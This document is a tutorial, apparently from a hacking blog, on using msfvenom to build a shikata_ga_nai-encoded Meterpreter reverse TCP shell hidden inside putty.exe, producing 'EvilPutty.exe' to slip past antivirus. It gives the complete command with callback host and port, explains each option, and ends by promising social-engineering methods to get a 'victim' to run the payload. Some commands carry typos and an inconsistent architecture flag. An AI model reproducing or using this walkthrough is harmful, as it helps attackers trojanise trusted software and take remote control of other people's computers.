## How to create a payload with MSF Venom
Hello 1337 newbs. Today we will go over how to create and obfuscate a reverse TCP shell through MSF Venom. I will be using Kali 2.0 to complete this so feel free to follow along.

To launch a successful attack you will need to be able to bypass anti-virus software or other host-based protection for successful exploitation. The most effective way to avoid anti-virus detection on your targetâ€™s computers is to create your own customized back-door. We can leverage the built in ability to obfuscate payloads within commonly used files. In this example I will use putty.exe to supply the payload and we will use MSF Venom's encoder to hide the payload from Anti-virus.

#### Disclaimer - This method will probably not bypass an up to date anti-virus

### MSF Venom
msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.


```
$ msfvenom --help
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>

Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
```
    
Lets take a look at some useful options
    
* -p designates the Metasploit payload we want to use
* -e designates the encoder we want to use
* -a designates the architecture we want to use (default is x86)
* -s designates the maximum size of the payload
* -i designates the number of iterations with which to encode the payload
* -x designates a custom executable file to use as a template ```

## Encoders
Encoders are the various algorithms and encoding schemes that Metasploit can use to re-encode the payloads.
We can looks at these by typing

```
$ msfvemon -l encoders

```
We will use x86\shikate_ga_nai in our example

## Building the Payload

I will start with our completed command and we then we will analyze each option in more detail.

```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\x00'-a x64 LHOST=10.1.10.2 LPORT=443 -x ~/Windows/Programs/putty.exe -f exe > ~/payloads/windows/EvilPutty.exe
```
* -p windows/meterpreter/reverse_tcp
  * Payload to use. A list can be found by using the command ```msfconsole``` and then entering ```show payloads``` at the msfconsole prompt.
* -e x86/shikata_ga_nai
  * Encoder - This is the algorithm that is used to encode your shell code in attempts to bypass anti-vurs. shikata_ga_nai is a polymorphic shell code encoder. More can be read about it on the web.
* -i 20
  * Iterations - this is the number of time your payload will be encoded.
* -b 
  * Bad Characters - A bad character is simply a list of unwanted characters that can break the shell codes. Depending on the application and the developer logic there is a different set of bad characters for every program that we would encounter. Some common ones include
    * 00 for NULL
    * OA for Line Feed \n
    * OD for Carriage Return \r
    * FF for Form Feed \f
* -a x86
  * This is the architecture of the program we are hiding our payload in.
* LHOST=
  * Listening Host - This will be the IP that we want our reverse TCP shell to call back too.
* LPORT=
  * Listening Port - This will be the port our host is listening on.
* -x ~/windows/Programs/putty.exe
  * Template - This is the path to the program we want to use as a template.
* -f 
  * Format - This is the output format we want.
* \> ~/payloads/windows/EvilPutty.exe
  * This is the output file.
 
# Wrapping it up
Although this method might not work every time, there is a very good possibility that the victim might not have anti-virus installed or turned on their machine. The next step would be coming up with a way to get someone to run this payload. There are many ways to do this. Next time we will cover some ways to social engineer someone to run this payload on their machine for you.
